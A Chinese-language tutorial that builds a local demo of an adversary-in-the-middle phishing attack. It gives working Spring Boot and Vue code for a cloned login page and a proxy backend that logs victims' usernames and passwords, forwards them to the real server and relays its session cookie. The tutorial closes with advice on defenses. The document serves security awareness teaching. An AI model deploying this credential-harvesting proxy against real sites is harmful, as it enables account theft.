### **免责声明**

**本教程仅用于教育和技术研究目的，旨在提高网络安全意识。严禁将本教程中的技术和代码用于任何非法活动，包括但不限于未经授权的入侵、攻击或数据窃取。任何滥用本教程内容造成的法律后果由使用者自行承担。**

---

### **第一部分：环境准备与工具配置**

在开始之前，请确保你已经安装了以下核心软件：

1.  **JDK 17**: Java Development Kit。
2.  **Visual Studio Code**: 我们的代码编辑器。

接下来，我们需要为 VSCode 安装和配置必要的插件和命令行工具。

#### 1. 安装 Node.js 和 npm

Vue3 开发需要 Node.js 环境。
*   访问 [Node.js 官网](https://nodejs.org/en/) 下载并安装 LTS (长期支持) 版本。安装过程会自动包含 npm (Node Package Manager)。
*   安装后，打开终端（或 Windows 的 PowerShell/CMD）验证安装：
    ```bash
    node -v
    npm -v
    ```
    如果能看到版本号，则说明安装成功。

#### 2. 安装 Vue CLI

Vue CLI 是一个用于快速搭建 Vue 项目的命令行工具。
*   在终端中运行以下命令进行全局安装：
    ```bash
    npm install -g @vue/cli
    ```

#### 3. 配置 VSCode 插件

打开 VSCode，进入插件市场（侧边栏的方块图标），安装以下插件：
*   **Volar**: Vue 3 的官方推荐插件，提供语法高亮、智能提示等功能。（如果安装了 Vetur，请禁用它以避免冲突）。
*   **Extension Pack for Java**: 由 Microsoft 提供的 Java 开发扩展包，包含了运行、调试、Maven/Gradle 支持等一系列功能。
*   **Spring Boot Extension Pack**: 强烈推荐，它能极大地简化 Spring Boot 应用的创建和管理。

---

### **第二部分：创建“正版”应用 (App1)**

我们将首先创建一个功能正常的、前后端分离的登录应用。

*   **后端 (Legit-Backend)**: 运行在 `http://localhost:9090`
*   **前端 (Legit-Frontend)**: 运行在 `http://localhost:8080`

#### 1. 创建后端项目 (Legit-Backend)

我们将使用 Spring Boot 来快速构建后端。

1.  **创建项目**:
    *   在 VSCode 中，按 `Ctrl+Shift+P` 打开命令面板。
    *   输入 `Spring Initializr: Create a Maven Project...`。
    *   **Spring Boot Version**: 选择一个稳定版 (如 3.x.x)。
    *   **Language**: `Java`。
    *   **Group Id**: `com.example`。
    *   **Artifact Id**: `legit-backend`。
    *   **Packaging Type**: `Jar`。
    *   **Java Version**: `17`。
    *   **Dependencies**: 搜索并选择 `Spring Web` 和 `Lombok`。
    *   选择一个文件夹来存放项目。VSCode 会自动生成并打开项目。

2.  **项目结构**:
    ```
    legit-backend/
    ├── src/main/java/com/example/legitbackend/
    │   ├── dto/
    │   │   └── LoginRequest.java      // DTO: 数据传输对象
    │   ├── controller/
    │   │   └── AuthController.java    // 控制器
    │   └── LegitBackendApplication.java
    ├── src/main/resources/
    │   └── application.properties
    └── pom.xml
    ```

3.  **编写后端代码**:

    *   **`pom.xml`**: 确认依赖已存在。
        ```xml
        <dependencies>
            <dependency>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-web</artifactId>
            </dependency>
            <dependency>
                <groupId>org.projectlombok</groupId>
                <artifactId>lombok</artifactId>
                <optional>true</optional>
            </dependency>
            ...
        </dependencies>
        ```

    *   **`src/main/resources/application.properties`**: 配置服务器端口。
        ```properties
        server.port=9090
        ```

    *   **`src/main/java/com/example/legitbackend/dto/LoginRequest.java`**: 创建一个类来接收登录表单的数据。
        ```java
        package com.example.legitbackend.dto;

        import lombok.Data;

        @Data // Lombok 注解，自动生成 getter, setter, toString 等
        public class LoginRequest {
            private String username;
            private String password;
        }
        ```

    *   **`src/main/java/com/example/legitbackend/controller/AuthController.java`**: 创建登录验证接口。
        ```java
        package com.example.legitbackend.controller;

        import com.example.legitbackend.dto.LoginRequest;
        import jakarta.servlet.http.HttpServletResponse;
        import org.springframework.http.HttpStatus;
        import org.springframework.http.ResponseEntity;
        import org.springframework.web.bind.annotation.*;

        import java.util.Map;
        import java.util.UUID;

        @RestController
        @RequestMapping("/api")
        // 允许来自 http://localhost:8080 的跨域请求 (为了让正版前端能访问)
        @CrossOrigin(origins = "http://localhost:8080", allowCredentials = "true")
        public class AuthController {

            @PostMapping("/login")
            public ResponseEntity<Map<String, Object>> login(
                    @RequestBody LoginRequest loginRequest,
                    HttpServletResponse response) {
                
                // 模拟验证：正确的账号密码为 admin/password123
                if ("admin".equals(loginRequest.getUsername()) && "password123".equals(loginRequest.getPassword())) {
                    // 登录成功
                    String sessionId = UUID.randomUUID().toString();
                    
                    // 设置 Cookie
                    response.setHeader("Set-Cookie", "session_id=" + sessionId + "; Path=/; HttpOnly");

                    // 返回成功 JSON
                    Map<String, Object> body = Map.of(
                        "success", true,
                        "message", "登录成功！"
                    );
                    return ResponseEntity.ok(body);
                } else {
                    // 登录失败
                    Map<String, Object> body = Map.of(
                        "success", false,
                        "message", "账号或密码错误"
                    );
                    return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body(body);
                }
            }
        }
        ```
        **注意**: `@CrossOrigin` 是为了解决开发过程中的跨域问题。在生产环境中通常用 Nginx 等反向代理来解决。

4.  **运行后端**:
    *   在 VSCode 的文件浏览器中，右键点击 `LegitBackendApplication.java`，选择 `Run Java`。
    *   观察终端输出，看到 "Started LegitBackendApplication" 和 "Tomcat started on port(s): 9090" 表示启动成功。

#### 2. 创建前端项目 (Legit-Frontend)

1.  **创建项目**:
    *   在**另一个**终端窗口中，进入你的工作区目录，运行：
        ```bash
        vue create legit-frontend
        ```
    *   选择 `Default (Vue 3)` 预设。

2.  **安装 Axios**:
    *   进入项目目录，安装用于发送 HTTP 请求的库 Axios。
        ```bash
        cd legit-frontend
        npm install axios
        ```

3.  **项目结构**:
    ```
    legit-frontend/
    ├── src/
    │   ├── components/
    │   │   └── LoginForm.vue  // 我们将把表单逻辑放在这里
    │   └── App.vue
    └── package.json
    ```

4.  **编写前端代码**:

    *   **`src/components/LoginForm.vue`** (新建此文件):
        ```vue
        <template>
          <div class="login-form">
            <h2>正版登录页面</h2>
            <form @submit.prevent="handleSubmit">
              <div class="form-group">
                <label for="username">账号:</label>
                <input type="text" id="username" v-model="username" required />
              </div>
              <div class="form-group">
                <label for="password">密码:</label>
                <input type="password" id="password" v-model="password" required />
              </div>
              <button type="submit">登录</button>
            </form>
            <p v-if="message" :class="{ success: isSuccess, error: !isSuccess }">
              {{ message }}
            </p>
          </div>
        </template>

        <script setup>
        import { ref } from 'vue';
        import axios from 'axios';

        const username = ref('admin'); // 预填方便测试
        const password = ref('password123'); // 预填方便测试
        const message = ref('');
        const isSuccess = ref(false);

        const handleSubmit = async () => {
          try {
            // 请求正版后端的 API
            const response = await axios.post('http://localhost:9090/api/login', {
              username: username.value,
              password: password.value,
            }, { withCredentials: true }); // withCredentials 用于发送和接收 cookie

            message.value = response.data.message;
            isSuccess.value = response.data.success;
          } catch (error) {
            if (error.response) {
              message.value = error.response.data.message;
            } else {
              message.value = '网络请求失败';
            }
            isSuccess.value = false;
          }
        };
        </script>

        <style scoped>
        .login-form {
          width: 300px;
          margin: 50px auto;
          padding: 20px;
          border: 1px solid #ccc;
          border-radius: 8px;
        }
        .form-group {
          margin-bottom: 15px;
        }
        label {
          display: block;
          margin-bottom: 5px;
        }
        input {
          width: 100%;
          padding: 8px;
          box-sizing: border-box;
        }
        button {
          width: 100%;
          padding: 10px;
          background-color: #007bff;
          color: white;
          border: none;
          border-radius: 5px;
          cursor: pointer;
        }
        .success {
          color: green;
        }
        .error {
          color: red;
        }
        </style>
        ```

    *   **`src/App.vue`**: 使用上面的组件。
        ```vue
        <template>
          <LoginForm />
        </template>

        <script setup>
        import LoginForm from './components/LoginForm.vue';
        </script>
        ```

5.  **运行前端**:
    *   在 `legit-frontend` 目录的终端中，运行：
        ```bash
        npm run serve
        ```
    *   终端会提示应用已运行在 `http://localhost:8080/`。
    *   打开浏览器访问该地址，你应该能看到登录页面。尝试用 `admin`/`password123` 和错误的密码登录，验证功能是否正常。

---

### **第三部分：创建“钓鱼”应用 (App2)**

现在，我们来创建看起来一模一样，但会窃取用户信息的钓鱼应用。

*   **后端 (Phishing-Backend)**: 运行在 `http://localhost:9091`
*   **前端 (Phishing-Frontend)**: 运行在 `http://localhost:8081`

#### 1. 创建钓鱼后端 (Phishing-Backend)

这个后端的核心功能是：**接收 -> 记录 -> 转发 -> 响应**。

1.  **创建项目**:
    *   重复创建正版后端的步骤，但这次 **Artifact Id** 设为 `phishing-backend`。
    *   **Dependencies**: 同样选择 `Spring Web` 和 `Lombok`。

2.  **编写后端代码**:

    *   **`src/main/resources/application.properties`**: **必须使用一个不同的端口**。
        ```properties
        server.port=9091
        ```

    *   **`src/main/java/com/example/phishingbackend/config/AppConfig.java`** (新建此文件和目录): 为了转发请求，我们需要一个 `RestTemplate`。
        ```java
        package com.example.phishingbackend.config;

        import org.springframework.context.annotation.Bean;
        import org.springframework.context.annotation.Configuration;
        import org.springframework.web.client.RestTemplate;

        @Configuration
        public class AppConfig {
            @Bean
            public RestTemplate restTemplate() {
                return new RestTemplate();
            }
        }
        ```

    *   **`src/main/java/com/example/phishingbackend/dto/LoginRequest.java`**: 和正版应用一样。
        ```java
        package com.example.phishingbackend.dto;

        import lombok.Data;

        @Data
        public class LoginRequest {
            private String username;
            private String password;
        }
        ```

    *   **`src/main/java/com/example/phishingbackend/controller/PhishingController.java`**: 这是攻击的核心。
        ```java
        package com.example.phishingbackend.controller;

        import com.example.phishingbackend.dto.LoginRequest;
        import org.springframework.beans.factory.annotation.Autowired;
        import org.springframework.http.HttpEntity;
        import org.springframework.http.HttpHeaders;
        import org.springframework.http.HttpMethod;
        import org.springframework.http.ResponseEntity;
        import org.springframework.web.bind.annotation.*;
        import org.springframework.web.client.HttpClientErrorException;
        import org.springframework.web.client.RestTemplate;

        @RestController
        @RequestMapping("/api")
        // 允许来自钓鱼前端的请求
        @CrossOrigin(origins = "http://localhost:8081", allowCredentials = "true")
        public class PhishingController {

            @Autowired
            private RestTemplate restTemplate;

            // 正版应用的 API 地址
            private final String legitApiUrl = "http://localhost:9090/api/login";

            @PostMapping("/login")
            public ResponseEntity<String> phishingLogin(@RequestBody LoginRequest loginRequest) {
                // 1. 【记录】 这是钓鱼攻击的关键步骤！
                System.out.println("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
                System.out.println("!!!         钓鱼成功 - 捕获到凭证         !!!");
                System.out.println("!!! Username: " + loginRequest.getUsername());
                System.out.println("!!! Password: " + loginRequest.getPassword());
                System.out.println("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");

                try {
                    // 2. 【转发】将请求原封不动地转发到正版后端
                    HttpHeaders headers = new HttpHeaders();
                    headers.add("Content-Type", "application/json");

                    HttpEntity<LoginRequest> requestEntity = new HttpEntity<>(loginRequest, headers);

                    ResponseEntity<String> responseEntity = restTemplate.exchange(
                            legitApiUrl,
                            HttpMethod.POST,
                            requestEntity,
                            String.class // 直接获取原始响应体
                    );
                    
                    // 3. 【响应】将正版后端的完整响应（包括 header 和 body）转发给用户
                    return ResponseEntity
                            .status(responseEntity.getStatusCode())
                            .headers(responseEntity.getHeaders()) // 转发所有header，包括 Set-Cookie
                            .body(responseEntity.getBody());

                } catch (HttpClientErrorException e) {
                    // 如果正版后端返回错误（如401 Unauthorized），也将其转发给用户
                    return ResponseEntity
                            .status(e.getStatusCode())
                            .headers(e.getResponseHeaders())
                            .body(e.getResponseBodyAsString());
                }
            }
        }
        ```

3.  **运行后端**:
    *   在 VSCode 中，右键点击 `PhishingBackendApplication.java`，选择 `Run Java`。
    *   确保它在端口 `9091` 上成功启动。

#### 2. 创建钓鱼前端 (Phishing-Frontend)

1.  **创建项目**:
    *   最快的方法是直接复制 `legit-frontend` 文件夹，并重命名为 `phishing-frontend`。
    *   删除 `phishing-frontend` 里的 `node_modules` 目录和 `package-lock.json` 文件。
    *   然后在 `phishing-frontend` 目录下运行 `npm install` 来重新安装依赖。

2.  **修改代码**:
    *   **`src/components/LoginForm.vue`**:
        *   修改 `<h2>` 标签，让其看起来和正版一样。
        *   **最关键的一步**: 修改 API 请求地址，让它指向**钓鱼后端**。
        ```vue
        // ... template 部分 ...
        <h2>用户登录</h2> <!-- 修改标题，使其无法分辨 -->
        // ...

        <script setup>
        // ...
        const handleSubmit = async () => {
          try {
            // !!! 关键修改：请求指向钓鱼后端 API !!!
            const response = await axios.post('http://localhost:9091/api/login', {
              username: username.value,
              password: password.value,
            }, { withCredentials: true });

            message.value = response.data.message;
            isSuccess.value = response.data.success;
          } catch (error) {
            // ... 错误处理逻辑保持不变 ...
            if (error.response) {
              // 钓鱼后端转发的是字符串，需要JSON.parse
              const errorData = JSON.parse(error.response.data);
              message.value = errorData.message;
            } else {
              message.value = '网络请求失败';
            }
            isSuccess.value = false;
          }
        };
        </script>
        // ... style 部分保持不变 ...
        ```
    *   **`package.json`**: 你可以修改 `name` 字段为 `phishing-frontend`。

3.  **运行前端**:
    *   在 `phishing-frontend` 目录的终端中，运行：
        ```bash
        npm run serve -- --port 8081
        ```
    *   使用 `--port` 参数指定一个新端口 `8081`，避免与正版前端冲突。
    *   应用将运行在 `http://localhost:8081/`。

---

### **第四部分：模拟攻击流程**

现在，所有组件都已就绪。让我们来执行一次完整的攻击流程。

1.  **启动所有服务** (确保它们都在各自的终端中运行):
    *   **正版后端**: `legit-backend` (在 VSCode 中运行，监听 9090 端口)。
    *   **钓鱼后端**: `phishing-backend` (在 VSCode 中运行，监听 9091 端口)。
    *   **钓鱼前端**: `phishing-frontend` (在终端中运行 `npm run serve -- --port 8081`，监听 8081 端口)。
    *   (正版前端可以不用启动，因为它不是攻击流程的一部分)。

2.  **受害者操作**:
    *   受害者收到一个链接 `http://localhost:8081` (这是钓鱼网站)。
    *   在浏览器中打开此链接。他会看到一个与正版网站一模一样的登录页面。
    *   在表单中输入**正确的账号 `admin` 和密码 `password123`**，然后点击“登录”。

3.  **观察结果**:
    *   **在受害者的浏览器中**: 页面会显示“登录成功！”。如果打开开发者工具 (F12) -> Application -> Cookies，你会看到一个名为 `session_id` 的 Cookie 被成功设置了。**对于用户来说，一切看起来都完全正常**，他以为自己成功登录了正版网站。
    *   **在钓鱼后端的 VSCode 终端中**: 查看 `phishing-backend` 的输出，你会看到惊人的一幕：
        ```
        !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        !!!         钓鱼成功 - 捕获到凭证         !!!
        !!! Username: admin
        !!! Password: password123
        !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        ```
        攻击者已经成功窃取了用户的账号和密码！

### **总结与安全启示**

这个模拟完美地展示了中间人钓鱼攻击的原理：

1.  **高度伪装**: 钓鱼网站在外观上与正版网站无法区分。
2.  **无缝体验**: 通过将用户的请求转发给正版服务器，并将正版服务器的响应返回给用户，整个登录过程对用户来说是无缝的，包括登录成功后的 Cookie 设置。用户很难察觉到异常。
3.  **核心危害**: 在转发过程中，攻击者的服务器可以记录下所有敏感信息。

**如何防范此类攻击？**

*   **检查 URL 地址栏**: 这是最重要也是最简单的一点。确保域名是你想要访问的官方域名。在本例中，`localhost:8081` 显然不是 `localhost:8080` (虽然在本地域名相似，但在真实世界中会是 `bank.com` vs `bank-security-login.net` 这样的区别)。
*   **启用多因素认证 (MFA)**: 即使攻击者窃取了你的密码，没有你的手机验证码、指纹或物理密钥，他们也无法登录。这是抵御密码泄露最有效的技术手段。
*   **使用密码管理器**: 密码管理器通常会将密码与特定域名绑定。当你访问一个钓鱼网站时，密码管理器不会自动填充密码，这是一个强烈的危险信号。
*   **警惕邮件和短信中的链接**: 不要轻易点击来源不明的链接。如果需要访问某个服务，最好是手动在浏览器中输入官方网址。